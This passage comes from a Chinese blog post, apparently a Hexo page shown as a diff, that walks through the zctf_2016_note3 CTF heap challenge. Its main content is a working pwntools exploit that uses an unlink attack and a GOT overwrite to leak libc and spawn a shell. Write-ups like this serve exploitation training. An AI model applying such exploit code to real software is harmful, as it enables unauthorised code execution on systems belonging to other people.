class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",)</span></span><br><span class="line">p=process(<span class="string">"./zctf_2016_note3"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./zctf_2016_note3'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'option---&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Input the length of the note content:(less than 1024)'</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Input the note content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'option---&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Input the id of the note:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Input the new content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'option---&gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Input the id of the note:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020c8</span></span><br><span class="line">fd=ptr-<span class="number">0x18</span></span><br><span class="line">bk=ptr-<span class="number">0x10</span></span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(fd)+p64(bk)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,payload1)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'CCCC'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'dddd'</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xb0</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,payload2) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)  <span class="comment">#he bing</span></span><br><span class="line"></span><br><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">'free'</span>]) * <span class="number">2</span> + p64(elf.got[<span class="string">'atoi'</span>]) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0X400730</span>)[:-<span class="number">1</span>]) <span class="comment">#puts_plt</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)  <span class="comment">#dele di 0 ge dui </span></span><br><span class="line"></span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">success(<span class="string">'atoi_addr = '</span> + <span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">base=atoi_addr-libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="/posts/0/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#zctf-2016-note3"><span class="toc-number">1.</span> <span class="toc-text">zctf_2016_note3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E9%81%93%E9%A2%98%E5%87%BD%E6%95%B0%E8%BE%83%E5%A4%9A%EF%BC%8C%E4%BD%86%E6%98%AF%E7%9B%B8%E5%AF%B9%E6%9D%A5%E8%AF%B4%E8%BF%98%E6%98%AF%E4%B8%80%E8%88%AC%E7%9A%84%E5%A0%86%E9%A2%98%EF%BC%8C%E5%87%BD%E6%95%B0%E5%A4%9A%E5%8F%AF%E4%B8%80%E5%A4%9A%E7%90%86%E8%A7%A3%EF%BC%8C%E4%B8%8B%E9%9D%A2%E5%BC%80%E5%A7%8B%E4%B8%80%E4%B8%80%E8%AE%B2%E8%A7%A3%E3%80%82"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E7%9C%8Badd%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">先看add函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E8%A1%8C%E7%9A%84size%E5%87%BD%E6%95%B0%EF%BC%8C%E6%98%AF%E7%94%A8%E6%9D%A5%E8%BE%93%E5%85%A5%E6%88%91%E4%BB%AC%E8%A6%81%E7%94%B3%E8%AF%B7%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%A0%86%EF%BC%8C%E7%82%B9%E8%BF%9B%E5%8E%BB%E7%9C%8B%E6%9C%89%E7%82%B9%E5%A4%8D%E6%9D%82%EF%BC%8C%E4%BD%86%E5%85%B6%E5%AE%9E%E5%92%8Cscanf%E5%B7%AE%E4%B8%8D%E5%A4%9A%EF%BC%8C%E9%87%8C%E9%9D%A2%E8%BF%98%E6%9C%89%E4%B8%AAsub-4008dd%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%8C%E5%86%8D%E7%82%B9%E8%BF%9B%E5%8E%BB"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub_4008dd的函数，再点进去</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-4008dd%E5%87%BD%E6%95%B0%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%9B%B8%E5%BD%93%E4%BA%8Eread%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%B8%8B%E9%9D%A2%E7%9A%84%E5%A5%BD%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E9%83%BD%E8%B0%83%E7%94%A8%E5%88%B0%EF%BC%8C%E5%85%88%E7%9C%8B%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E7%AC%AC%E4%B8%89%E4%B8%AA%E5%8F%82%E6%95%B0-char-a3%EF%BC%8C%E5%85%B6%E5%80%BC%E6%98%AF10%EF%BC%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0a1%E6%98%AF%E8%BE%93%E5%85%A5%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%AC%AC%E4%BA%8C%E4%B8%AA%E6%98%AF%E8%BE%93%E5%85%A5%E7%9A%84size%EF%BC%8C%E4%B8%80%E4%B8%AA%E4%B8%AA%E8%BE%93%E5%85%A5%E4%BF%9D%E5%AD%98%E5%9C%A8v7%E4%B8%AD%E4%BD%86%E6%98%AF%E6%9C%80%E9%95%BF%E4%B8%8D%E4%BC%9A%E8%B6%85%E8%BF%8732%E7%9A%84%E9%95%BF%E5%BA%A6%EF%BC%8C%E9%81%87%E5%88%B0%E2%80%99-x00%E2%80%99%E6%97%B6%E7%BB%93%E6%9D%9F%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84a3-10%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E6%88%AA%E6%AD%A2%E7%AC%A6%E2%80%99-xa%E2%80%99%EF%BC%8C%E5%90%8E%E9%9D%A2%E4%B8%A4%E6%9D%A1%E5%B7%B2%E7%BB%8F%E4%B8%8D%E9%87%8D%E8%A6%81%E4%BA%86%E3%80%82"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">sub_4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数 char a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’\x00’时结束，这里的a3&#x3D;10其实就是截止符’\xa’，后面两条已经不重要了。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E8%BF%94%E5%9B%9E%E7%9A%84%E6%98%AF%E6%88%91%E4%BB%AC%E8%BE%93%E5%85%A5%E7%9A%84%E7%AC%AC%E5%8D%81%E4%BA%8C%E8%A1%8Csize%E7%9A%84%E5%80%BC%E3%80%82%E7%AC%AC%E5%8D%81%E4%B9%9D%E8%A1%8C%E7%9A%84sub-4008dd%E5%87%BD%E6%95%B0%E4%B9%9F%E6%98%AF%E5%90%8C%E7%90%86%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BE%93%E5%85%A5%E7%9A%84%E9%95%BF%E5%BA%A6%E6%9C%89size%E5%86%B3%E5%AE%9A%E3%80%82%E5%A4%96%E9%9D%A2%E7%9A%84sub-400a30%E5%87%BD%E6%95%B0%E9%87%8C%E7%9A%84nptr%E6%98%AF%E5%9C%A8bss%E6%AE%B5%E4%B8%8A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%AD%98%E6%94%BE%E7%9A%84%E6%98%AFmalloc%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%98%E6%94%BE%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8A%A0%E5%85%AB%E7%9A%84%E5%9C%B0%E5%9D%80%E5%AD%98%E6%94%BEsize"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">最后返回的是我们输入的第十二行size的值。第十九行的sub_4008dd函数也是同理，不过输入的长度有size决定。外面的sub_400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0%EF%BC%8C%E5%85%88%E7%9C%8B%E7%AC%AC16%E8%A1%8C%E7%9A%84read%E5%87%BD%E6%95%B0%EF%BC%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0-amp-ptr-v3-%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E5%AD%98%E5%9C%A8%E5%A0%86%E4%B8%8A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8Cv3%E6%8C%87%E7%9A%84%E7%AC%AC%E5%87%A0%E4%B8%AA%E5%A0%86%EF%BC%8C%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E5%B0%B1%E6%98%AFbss%E5%AD%98%E5%A0%86%E5%9C%B0%E5%9D%80%E5%86%8D%E5%8A%A08%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%AD%98%E6%94%BE%E7%9A%84%E6%98%AFmalloc%E7%9A%84%E5%A4%A7%E5%B0%8F%EF%BC%8C%E5%92%8C%E5%8E%9F%E6%9D%A5%E7%9A%84%E4%B8%80%E6%A0%B7%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%8D%E5%AD%98%E5%9C%A8%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E6%83%85%E5%86%B5%E3%80%82"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">edit函数，先看第16行的read函数，第一个参数 *(&amp;ptr + v3)其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dele%E5%87%BD%E6%95%B0%EF%BC%8Cbss%E6%AE%B5%E4%B8%8A%E7%9A%84%E5%9C%B0%E5%9D%80%E6%B8%85%E9%9B%B6%EF%BC%8C%E5%A0%86%E4%B8%8A%E7%9A%84%E5%86%85%E5%AE%B9%E4%B9%9F%E8%A2%AB%E9%87%8A%E6%94%BE%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B9%B6%E4%B8%8D%E5%AD%98%E5%9C%A8UAF%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.0.7.</span> <span class="toc-text">dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E7%82%B9%E7%9A%84%E5%9C%B0%E6%96%B9%E5%9C%A8%E8%BF%99%EF%BC%8C%E5%B0%B1%E6%98%AFunlink%E7%9A%84%E6%80%8E%E4%B9%88%E6%9E%84%E9%80%A0%E3%80%82"><span class="toc-number">1.0.0.8.</span> <span class="toc-text">重点的地方在这，就是unlink的怎么构造。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E6%9E%84%E9%80%A0%E5%9B%9B%E4%B8%AA%E4%B8%AA%E5%A0%86%E5%9D%97%EF%BC%8C%E5%85%B6%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%A0%86%E5%A0%860%E7%9A%84fd%E5%92%8Cbk%E6%8C%87%E9%92%88%E5%88%86%E5%88%AB%E6%94%BEfd-ptr-0x18%E5%92%8Cbk-ptr-0x10%EF%BC%8C%E5%90%8E%E6%9C%9F%E4%BC%9A%E8%BF%9B%E8%A1%8C%E5%92%8C%E5%B9%B6"><span class="toc-number">1.0.0.9.</span> <span class="toc-text">先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd&#x3D;ptr-0x18和bk&#x3D;ptr-0x10，后期会进行和并</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%A0%86%E5%9D%97%EF%BC%8C%E6%88%91%E4%BB%AC%E7%94%B3%E8%AF%B7%E7%9A%84%E6%98%AF0%E7%9A%84%E5%A4%A7%E5%B0%8F%EF%BC%8C%E4%BD%86%E6%98%AFptmalloc%E4%BC%9A%E6%9C%80%E5%B0%91%E7%94%B3%E8%AF%B70x10-%E5%90%8E%E6%9C%9Fedit%E7%9A%84%E6%97%B6%E5%80%99%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%BA%A2%E5%87%BA%E7%9A%84%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%A6%86%E7%9B%96%E6%8E%89%E5%A0%86%E6%8C%87%E9%92%88%E3%80%82%E8%BF%99%E9%87%8C%E4%BC%9A%E6%9C%89%E4%B8%AA%E9%97%AE%E9%A2%98%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E5%9C%A8%E7%AC%AC%E4%B8%80%E6%AC%A1malloc%E5%A0%861%E7%9A%84%E6%97%B6%E5%80%99%E5%86%99%E5%85%A5payload2%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%9A%84%E8%AF%9D%E4%BA%8B%E6%BA%A2%E5%87%BA%E4%B8%8D%E5%88%B0%E5%A0%862"><span class="toc-number">1.0.0.10.</span> <span class="toc-text">关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10,后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%90%8E%E7%9A%84%E5%A0%86%E5%9D%97%E6%98%AF%E9%95%BF%E8%BF%99%E6%A0%B7%E7%9A%84%EF%BC%8C%E6%8A%8A%E7%AC%AC%E5%A0%862%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%92%8C%E5%AE%83%E7%9A%84previous-in-use%E4%BD%8D%E6%94%B9%E6%88%90%E4%BA%860-%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%B8%8A%E4%B8%80%E4%B8%AA%E5%A0%86%E5%A0%861%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8"><span class="toc-number">1.0.0.11.</span> <span class="toc-text">覆盖后的堆块是长这样的，把第堆2的大小和它的previous in use位改成了0,也就是上一个堆堆1没有使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%93%E5%88%A0%E6%8E%89%E5%A0%862%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E5%AE%83%E4%BC%9A%E6%A3%80%E6%9F%A5%E5%A0%861%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%8C%87%E9%92%88%EF%BC%8C%E6%98%AF%E6%BB%A1%E8%B6%B3%E6%9D%A1%E4%BB%B6%E7%9A%84%EF%BC%8C%E5%85%B6%E4%B8%AD%E7%9A%840xbbb018%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E5%AD%98%E6%94%BEsize%E7%9A%84%E5%A4%A7%E5%B0%8F%E6%98%AF%E5%8C%85%E6%8B%AC%E5%88%B00xbbb0b0%E8%BF%99%E9%87%8C%E7%9A%84%EF%BC%88%E7%8C%9C%E6%83%B3%EF%BC%89%EF%BC%8C%E8%80%8C0xbbb0c0%E8%BF%99%E9%87%8C%E7%9A%84%E5%A4%A7%E5%B0%8F%E6%98%AFprevious-size-0xbbb0c8%E8%BF%99%E9%87%8C%E8%A1%A8%E7%A4%BA%E4%B8%8A%E4%B8%80%E4%B8%AA%E5%A0%86%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8%E3%80%82"><span class="toc-number">1.0.0.12.</span> <span class="toc-text">当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous size ,0xbbb0c8这里表示上一个堆没有使用。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%93%E6%8A%8A%E5%A0%862delete%E6%97%B6%EF%BC%8C%E8%BF%99%E5%87%A0%E4%B8%AA%E5%A0%86%E5%B0%B1%E4%BC%9A%E8%BF%9B%E8%A1%8C%E5%90%88%E5%B9%B6dele%E4%B9%8B%E5%89%8D%EF%BC%8Cbss%E6%AE%B5%E4%B8%8A%E5%AD%98%E6%94%BE%E5%A0%86%E6%8C%87%E9%92%88%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84%E5%B8%83%E5%B1%80%E3%80%82"><span class="toc-number">1.0.0.13.</span> <span class="toc-text">当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%8C%E5%9C%A8dele-2-%E5%90%8E"><span class="toc-number">1.0.0.14.</span> <span class="toc-text">而在dele(2)后</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E6%94%BE%E5%A0%862%E7%9A%84%E6%8C%87%E9%92%88%E8%A2%AB%E7%BD%AE%E9%9B%B6%E4%BA%86"><span class="toc-number">1.0.0.15.</span> <span class="toc-text">存放堆2的指针被置零了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E5%A0%86%E5%90%88%E5%B9%B6%E5%90%8E%E7%9A%84%E6%A0%B7%E5%AD%90%EF%BC%8C%E5%BA%94%E8%AF%A5%E6%98%AF%E5%A0%861%E5%92%8C%E5%A0%862%E6%98%AF%E6%B2%A1%E6%9C%89%E8%A2%AB%E5%88%A9%E7%94%A8%E7%9A%84%E7%84%B6%E5%90%8E%E5%92%8C%E5%A0%860%E5%90%88%E5%B9%B6%E4%BA%86"><span class="toc-number">1.0.0.16.</span> <span class="toc-text">这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x151%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%B8%AD%E9%97%B40xbbb0c0%E8%BF%99%E9%87%8C%E7%9A%84%E5%A4%A7%E5%B0%8F%E7%9B%B8%E5%8A%A0%E4%BD%86%E6%98%AF%E5%A0%862%E8%BF%99%E9%87%8C%E7%9A%84%E5%86%85%E5%AD%98%E6%B2%A1%E6%9C%89%E9%87%8A%E6%94%BE"><span class="toc-number">1.0.0.17.</span> <span class="toc-text">0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B9%8B%E5%90%8E%E7%9A%84bin%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84"><span class="toc-number">1.0.0.18.</span> <span class="toc-text">之后的bin是这样的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BB%8E0x6020b0%E8%BF%99%E4%B8%AA%E4%BD%8D%E7%BD%AE%E5%AE%9E%E8%A1%8C%E4%BF%AE%E6%94%B9%E5%A0%86%E6%8C%87%E9%92%88%E4%BB%8E%E8%80%8C%E5%AF%B9got%E8%A1%A8%E7%9A%84%E6%94%B9%E5%86%99"><span class="toc-number">1.0.0.19.</span> <span class="toc-text">然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E6%8A%8Aedit%E5%A0%860-%E4%B9%9F%E5%B0%B1%E6%98%AFedit0x602018%EF%BC%88free-got-%E5%9C%B0%E5%9D%80%E7%9A%84%E5%86%85%E5%AE%B9%E6%94%B9%E5%86%99%E6%88%90-0x400730-puts-plt"><span class="toc-number">1.0.0.20.</span> <span class="toc-text">再把edit堆0,也就是edit0x602018（free_got)地址的内容改写成(0x400730)puts_plt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E6%A0%B7%E5%86%8Ddele%E5%A0%861%E7%9A%84%E6%97%B6%E5%80%99%E4%B9%9F%E5%B0%B1%E6%98%AFfree-0x6020d0%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFputs-elf-got-%E2%80%98atoi%E2%80%99-%E4%BB%8E%E8%80%8C%E8%8E%B7%E5%BE%97atoi%E7%9A%84got%E9%A1%B9%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%8F%AF%E4%BB%A5%E7%AE%97%E5%87%BAlibc%E7%9A%84%E5%81%8F%E7%A7%BB"><span class="toc-number">1.0.0.21.</span> <span class="toc-text">这样再dele堆1的时候也就是free 0x6020d0这个地址，也就是puts(elf.got[‘atoi’]),从而获得atoi的got项的内容，从而可以算出libc的偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%86%8Dedit%E5%A0%863%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF0x6020e0%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%EF%BC%8C%E6%9B%B4%E6%94%B9atoi%E7%9A%84got%E8%A1%A8%E7%9A%84%E5%9C%B0%E5%9D%80%E4%B8%BAsytem%EF%BC%8C%E5%86%8D%E4%BB%8E%E5%BC%80%E5%A7%8B%E6%97%B6%E5%80%99%E8%8F%9C%E5%8D%95%E6%9C%89%E4%B8%AAatoi%E5%87%BD%E6%95%B0%E7%84%B6%E5%90%8E%E5%86%99%E5%85%A5%E7%9A%84%E5%86%85%E5%AE%B9%E4%B8%BA%E2%80%98-bin-sh%E2%80%99%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%8F%90%E6%9D%83%E4%BA%86%E3%80%82"><span class="toc-number">1.0.0.22.</span> <span class="toc-text">然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘&#x2F;bin&#x2F;sh’就可以提权了。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84exp"><span class="toc-number">1.0.0.23.</span> <span class="toc-text">最后的exp</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a target="_blank" rel="noopener" href="//posts/0/"></a>
+            </p>
+           
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '/posts/0/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~大噶好。唔系可乐爱宅着，欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
